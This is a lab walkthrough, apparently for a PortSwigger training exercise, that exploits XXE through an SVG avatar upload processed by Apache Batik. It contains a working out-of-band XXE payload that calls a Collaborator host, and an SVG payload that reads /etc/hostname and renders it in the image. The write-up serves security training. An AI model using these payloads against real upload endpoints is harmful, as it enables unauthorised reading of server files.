
# Exploiting XXE via image file upload

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

Hint: The SVG image format uses XML.


---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/1.png)

---------------------------------------------




![img](images/Exploiting%20XXE%20via%20image%20file%20upload/2.png)


The avatar is sent within the comment:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/3.png)


We will change the "filename" to “test.svg” and the "Content-Type" to “image/svg+xml”, and then change the content to an XXE payload. 

First I tested if it is possible to generate an HTTP request to the Collaborator url:

```
-----------------------------39756462762517607865870849077
...
Content-Disposition: form-data; name="avatar"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://w63x7veqbibnsmco4xvkaucwyn4es4gt.oastify.com"> ]><stockCheck><productId>&xxe;	</productId><storeId>1</storeId></stockCheck>
...
```



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/4.png)


The server returns a 500 error code but the connections were generated:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/5.png)


And in the HTML response we can read this:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/6.png)


I got to this payload, which generates a 302 code and the comment is created in the post:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```


And you can see the hostname ("81da8cd96d3a") in the image:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/7.png)



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/8.png)
